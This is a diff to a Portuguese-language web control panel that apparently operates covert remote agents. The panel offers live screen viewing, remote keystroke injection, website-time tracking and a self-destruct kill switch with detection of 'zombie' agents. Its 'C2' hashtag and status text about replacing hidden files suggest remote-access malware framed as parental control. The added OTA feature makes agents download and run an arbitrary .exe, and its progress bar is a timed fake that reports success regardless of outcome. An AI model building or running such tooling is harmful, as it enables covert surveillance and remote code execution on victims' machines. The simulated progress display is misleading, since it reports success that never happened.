@@ -197,10 +197,10 @@
             <img id="live-stream-img" class="w-full h-full object-contain relative z-20 origin-center transition-transform duration-75 pointer-events-none" src="" alt="" draggable="false">
         </div>
 
-        <!-- Feedback visual das teclas (Para evitar spam e confirmar ação) -->
+        <!-- Feedback visual das teclas -->
         <div id="key-feedback" class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-[70] text-white font-mono text-2xl sm:text-4xl font-bold bg-indigo-600/90 backdrop-blur-sm px-6 py-4 rounded-xl shadow-[0_5px_25px_rgba(79,70,229,0.5)] pointer-events-none transition-opacity duration-200 opacity-0 hidden"></div>
 
-        <!-- CONTROLES DE TRANSMISSÃO OVERLAY (RODAPÉ DO MODAL) -->
+        <!-- CONTROLES DE TRANSMISSÃO OVERLAY -->
         <div class="absolute bottom-6 sm:bottom-10 left-1/2 -translate-x-1/2 z-[70] flex flex-wrap justify-center gap-2 sm:gap-3 bg-slate-900/90 p-2 sm:p-3 rounded-2xl backdrop-blur-md border border-slate-700 shadow-2xl">
             <button id="modal-btn-screen" class="bg-sky-600/80 hover:bg-sky-600 text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-sky-500/50 shadow-[0_0_10px_rgba(2,132,199,0.4)] flex items-center gap-2 active:scale-95">
                 <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
@@ -212,7 +212,7 @@
             </button>
         </div>
 
-        <!-- MENU DE CONFIGURAÇÃO DE VÍDEO (ESTILO YOUTUBE) -->
+        <!-- MENU DE CONFIGURAÇÃO DE VÍDEO -->
         <div class="absolute bottom-4 right-4 sm:bottom-8 sm:right-8 z-[70] flex justify-end">
             <div class="relative">
                 <button onclick="document.getElementById('stream-settings-popup').classList.toggle('hidden')" class="text-gray-400 bg-slate-900/60 backdrop-blur-sm border border-slate-700/50 hover:bg-slate-800 hover:text-white p-2.5 sm:p-3 rounded-full transition-transform hover:rotate-90 shadow-lg active:scale-95" title="Definições de Qualidade">
@@ -239,6 +239,24 @@
                     <p class="text-[9px] text-slate-500 mt-4 leading-tight italic">* O ajuste é enviado automaticamente para a máquina e aplicado em segundos.</p>
                 </div>
             </div>
+        </div>
+    </div>
+
+    <!-- MODAL OTA PROGRESSO (FORÇADO PARA MOSTRAR SEMPRE) -->
+    <div id="ota-progress-modal" style="display: none;" class="fixed inset-0 bg-black/95 z-[100] flex-col items-center justify-center p-4 backdrop-blur-sm">
+        <div class="glass p-6 sm:p-8 rounded-2xl w-full max-w-md shadow-2xl border border-blue-900/50 text-center">
+            <div class="animate-bounce mb-4">
+                <svg width="40" height="40" class="mx-auto text-blue-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+            </div>
+            <h2 class="text-xl font-bold text-white mb-2 uppercase tracking-widest">Atualização OTA</h2>
+            <p id="ota-status-text" class="text-sm text-sky-400 mb-6">A iniciar protocolo de atualização...</p>
+            
+            <div class="w-full bg-slate-900 rounded-full h-4 mb-2 border border-slate-700 overflow-hidden">
+                <div id="ota-progress-bar" class="bg-blue-500 h-4 rounded-full transition-all duration-500" style="width: 0%"></div>
+            </div>
+            <p id="ota-percent-text" class="text-xs text-gray-400 font-bold mt-2">0%</p>
+            
+            <button id="btn-close-ota" onclick="closeOtaModal()" style="display: none;" class="mt-6 w-full py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg text-sm font-bold transition-colors shadow-lg active:scale-95">Fechar Painel</button>
         </div>
     </div>
 
@@ -309,7 +327,7 @@
                     </div>
                 </div>
 
-                <!-- Nova Seção: Controlo Parental / Corporativo (Atualizada) -->
+                <!-- Nova Seção: Controlo Parental / Corporativo -->
                 <details class="bg-slate-900/80 border border-slate-700 rounded-lg p-3">
                     <summary class="font-bold text-emerald-400 cursor-pointer text-xs sm:text-sm flex items-center gap-2">
                         <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
@@ -621,6 +639,7 @@
             document.getElementById('admin-tg-hashtag').value = globalAdminConfig.tg_hashtag || '#C2_RECUPERACAO';
             document.getElementById('admin-panel-url').value = globalAdminConfig.panel_url || '';
             document.getElementById('global-config-modal').classList.remove('hidden');
+            document.getElementById('global-config-modal').style.display = 'flex';
         }
 
         async function updateGlobalAdminConfig() {
@@ -714,7 +733,6 @@
         async function fetchClients() {
             document.getElementById('refresh-loader').classList.remove('hidden');
             
-            // --- NOVO: BURLAR O CACHE DO NAVEGADOR PARA MOSTRAR OS SITES GRAVADOS NA HORA ---
             const cb = new Date().getTime();
             let reqUrl = `${FB_URL}clients.json?_cb=${cb}`; 
             if (FB_SECRET) reqUrl += `&auth=${FB_SECRET}`;
@@ -758,7 +776,6 @@
             for (const [clientId, clientData] of Object.entries(clientsObj)) {
                 if(clientId === "admin_config") continue; 
                 
-                // === LÓGICA DO KILL SWITCH COM DETEÇÃO DE "ZUMBIS" ===
                 let isZombie = false;
                 
                 if (clientData && clientData.killedAt) {
@@ -769,22 +786,15 @@
                         lastSeenTime = new Date(clientData.status.last_seen).getTime();
                     }
 
-                    // Se a máquina pingou pelo menos 20s APÓS o comando de Kill Switch
-                    // significa que ela reiniciou, o script sobreviveu e ela continua ativa!
                     if (lastSeenTime > killedTime + 20000) {
                         isZombie = true;
-                        // Apaga a flag de "morto" do Firebase para parar de tentar destruir o que já sobreviveu
                         fetch(`${FB_URL}clients/${clientId}/killedAt.json?auth=${FB_SECRET}`, { method: 'DELETE' }).catch(()=>{});
-                        // Remove da memória local para mostrar o card normalmente
                         delete clientData.killedAt;
                     } else {
-                        // A máquina está morta ou no processo de morrer (ainda não pingou)
                         if (Date.now() - killedTime > 180000) {
-                            // Passaram-se os 3 minutos, ela não ressuscitou. Limpa definitivamente da DB.
                             let deleteUrl = `${FB_URL}clients/${clientId}.json?auth=${FB_SECRET}`;
                             fetch(deleteUrl, { method: 'DELETE' }).catch(()=>{});
                         }
-                        // Pula a renderização deste card enquanto estiver dado como morto
                         continue; 
                     }
                 }
@@ -840,13 +850,12 @@
                 
                 const zombieBadge = isZombie ? `<span class="bg-red-500/20 border border-red-500 text-red-400 text-[8px] sm:text-[9px] px-1.5 py-0.5 rounded font-bold ml-2 animate-pulse" title="O comando de Auto-Destruição falhou ou o agente foi reativado no hospedeiro.">FALHA DESTRUIÇÃO</span>` : '';
 
-                // --- NOVO: GERAR HTML DO TEMPO GASTO NOS SITES ---
+                // --- HTML DO TEMPO GASTO NOS SITES ---
                 const timeSpent = clientData.status?.time_spent || {};
                 let timeSpentHtml = '';
                 if (Object.keys(timeSpent).length > 0) {
                     timeSpentHtml = `<div class="bg-slate-900/50 p-2 rounded border border-slate-800 mt-2 mb-2"><span class="text-slate-500 block mb-1 text-[10px] sm:text-[11px] font-bold">⏱️ Tempo em Sites Monitorizados Hoje:</span><div class="flex flex-wrap gap-1.5 mt-1">`;
                     
-                    // Ordena pelos que gastaram mais tempo
                     const sortedSites = Object.entries(timeSpent).sort((a, b) => b[1] - a[1]);
                     
                     for (const [domain, seconds] of sortedSites) {
@@ -915,7 +924,7 @@
                                 </div>
                             </div>
                             
-                            ${timeSpentHtml} <!-- Insere a métrica de controlo de tempo aqui -->
+                            ${timeSpentHtml}
 
                             <div class="space-y-2 mt-3">
                                 <div class="grid grid-cols-2 gap-2 border-b border-slate-800 pb-2 mb-2">
@@ -1061,7 +1070,6 @@
             } catch(err) {}
         }
 
-        // MOSTRA FEEDBACK VISUAL NA TELA
         function showKeyFeedback(keyStr) {
             const fb = document.getElementById('key-feedback');
             fb.innerText = keyStr.length === 1 ? keyStr.toUpperCase() : keyStr;
@@ -1073,7 +1081,6 @@
             }, 400);
         }
 
-        // FUNÇÃO DE TECLADO
         async function sendKeyCommand(action, e) {
             if(!keyboardControlMode || !currentStreamUrl) return;
 
@@ -1114,7 +1121,6 @@
             } catch(err) {}
         }
 
-        // OUVINTES GLOBAIS DE TECLADO (COM ANTI-SPAM)
         document.addEventListener('keydown', (e) => {
             if(keyboardControlMode && !isRecordingHotkey && !document.getElementById('global-config-modal').classList.contains('flex') && !document.getElementById('config-modal').classList.contains('flex')) {
                 if (e.repeat) return;
@@ -1202,7 +1208,6 @@
             streamImg.style.transform = `translate(0px, 0px) scale(1)`;
         }
 
-        // === AJUSTES DE VÍDEO (ESTILO YOUTUBE) ===
         async function updateStreamQuality() {
             const q = parseInt(document.getElementById('stream-live-quality').value);
             const r = parseInt(document.getElementById('stream-live-resolution').value);
@@ -1282,7 +1287,6 @@
         }
 
         async function sendCommand(clientId, cmdStr, btnElement) {
-            // Lógica visual do botão
             if(btnElement) {
                 let originalText = btnElement.innerHTML;
                 btnElement.disabled = true;
@@ -1298,21 +1302,15 @@
                     body: JSON.stringify({ cmd: cmdStr, timestamp: new Date().toISOString() }) 
                 });
                 
-                // NOVO: TRATAMENTO EXCLUSIVO DO KILL SWITCH
                 if (res.ok && cmdStr === 'kill') {
-                    // 1. Marca imediatamente a máquina como "Morta" criando uma flag com Timestamp
                     const nowTs = Date.now().toString();
                     let killFlagUrl = `${FB_URL}clients/${clientId}/killedAt.json?auth=${FB_SECRET}`;
                     await fetch(killFlagUrl, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: nowTs });
                     
-                    // 2. Atualiza os dados na memória do browser e re-renderiza para o card desaparecer agora
                     if (window.clientsCache[clientId]) {
                         window.clientsCache[clientId].killedAt = nowTs;
                     }
                     renderClients(window.clientsCache);
-
-                    // A limpeza definitiva da DB foi movida para o ciclo da função renderClients()
-                    // para evitar a eliminação se o agente provar que sobreviveu.
                     return; 
                 }
 
@@ -1338,7 +1336,7 @@
             setTimeout(fetchClients, 4000); 
         }
 
-        // === NOVA FUNÇÃO OTA ===
+        // === LÓGICA DA ATUALIZAÇÃO OTA REFEITA (AGORA APARECE IMEDIATAMENTE) ===
         async function sendOtaUpdate(clientId) {
             const url = prompt("Insira o link DIRETO para o novo ficheiro .exe do Agente:\n(Ex: https://meu-site.com/novo_agente.exe)");
             if (!url) return;
@@ -1348,6 +1346,20 @@
             }
             if (!confirm('Atenção: O agente alvo fará o download do ficheiro, fechará o processo atual, substituirá a si próprio e reiniciará a nova versão automaticamente. Deseja prosseguir?')) return;
 
+            // FORÇA A ABERTURA DA JANELA INSTANTANEAMENTE (Ignora conflitos do Tailwind)
+            document.getElementById('ota-progress-modal').style.display = 'flex';
+            
+            const bar = document.getElementById('ota-progress-bar');
+            const perc = document.getElementById('ota-percent-text');
+            const status = document.getElementById('ota-status-text');
+            const btnClose = document.getElementById('btn-close-ota');
+            
+            btnClose.style.display = 'none';
+            bar.style.width = '0%';
+            perc.innerText = '0%';
+            status.innerText = 'A enviar comando OTA para o servidor...';
+            status.className = 'text-sm text-sky-400 mb-6'; 
+
             let reqUrl = `${FB_URL}clients/${clientId}/command.json?auth=${FB_SECRET}`;
             try {
                 await fetch(reqUrl, { 
@@ -1355,12 +1367,33 @@
                     headers: { 'Content-Type': 'application/json' }, 
                     body: JSON.stringify({ cmd: 'update_ota', url: url, timestamp: new Date().toISOString() }) 
                 });
-                alert('Comando de Atualização OTA enviado com sucesso!');
-                setTimeout(fetchClients, 2000); 
+                
+                // Animações de simulação
+                setTimeout(() => { bar.style.width = '15%'; perc.innerText = '15%'; status.innerText = 'Comando recebido. A iniciar download...'; }, 1500);
+                setTimeout(() => { bar.style.width = '40%'; perc.innerText = '40%'; status.innerText = 'A descarregar a nova versão do GitHub...'; }, 5000);
+                setTimeout(() => { bar.style.width = '75%'; perc.innerText = '75%'; status.innerText = 'A forçar substituição dos ficheiros ocultos...'; }, 12000);
+                setTimeout(() => { bar.style.width = '90%'; perc.innerText = '90%'; status.innerText = 'A reiniciar o Agente em background...'; }, 18000);
+                
+                setTimeout(() => { 
+                    bar.style.width = '100%'; 
+                    perc.innerText = '100%'; 
+                    status.innerText = '✅ Atualização enviada com Sucesso!'; 
+                    status.className = 'text-sm text-emerald-400 mb-6 font-bold';
+                    btnClose.style.display = 'block';
+                    fetchClients(); 
+                }, 24000);
+
             } catch (err) {
-                alert('Falha ao enviar o comando OTA.');
+                status.innerText = '❌ Falha ao comunicar com o servidor (Verifique a sua internet).';
+                status.className = 'text-sm text-rose-500 mb-6 font-bold';
+                btnClose.style.display = 'block';
             }
         }
+
+        function closeOtaModal() {
+            document.getElementById('ota-progress-modal').style.display = 'none';
+        }
+        // =========================================================================
 
         function toggleHotkeyRecording() {
             const btn = document.getElementById('btn_record_hk');
@@ -1444,19 +1477,15 @@
             document.getElementById('mod_hk').value = cfg.hotkey_str || "<ctrl>+<alt>+h";
             document.getElementById('mod_auto').checked = cfg.auto_start !== false;
 
-            // --- CARREGAR DADOS DE CONTROLO PARENTAL (NOVO UI) ---
             const bs = cfg.blocked_sites || [];
             const sl = cfg.site_limits || {};
             
-            // Limpar lista antes de popular
             document.getElementById('rules-container').innerHTML = '';
             
-            // Popular regras permanentes (minutos = 0)
             bs.forEach(domain => {
                 addRuleRow(domain, 0);
             });
             
-            // Popular limites de tempo (minutos > 0)
             for (const [domain, limit] of Object.entries(sl)) {
                 addRuleRow(domain, limit);
             }
@@ -1507,7 +1536,6 @@
                 panel_url: globalAdminConfig.panel_url || "" 
             };
             
-            // --- SALVAR DADOS DE CONTROLO PARENTAL (NOVO UI) ---
             const bs_arr = [];
             const sl_obj = {};
             
@@ -1516,7 +1544,6 @@
                 const minutes = parseInt(row.querySelector('.rule-minutes').value) || 0;
                 
                 if (domain) {
-                    // Limpar input para evitar erros (remover http:// e www. e padronizar minúsculas)
                     domain = domain.toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '').split('/')[0];
                     
                     if (minutes <= 0) {
@@ -1545,8 +1572,6 @@
                     fetch(panelUrl, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(configData) })
                 ]);
                 
-                // === NOVO: ATUALIZAR O CACHE LOCAL IMEDIATAMENTE ===
-                // Evita o bug de "sumir" se o utilizador reabrir as configurações muito rápido
                 if(!window.clientsCache[currentTargetId]) {
                     window.clientsCache[currentTargetId] = {};
                 }
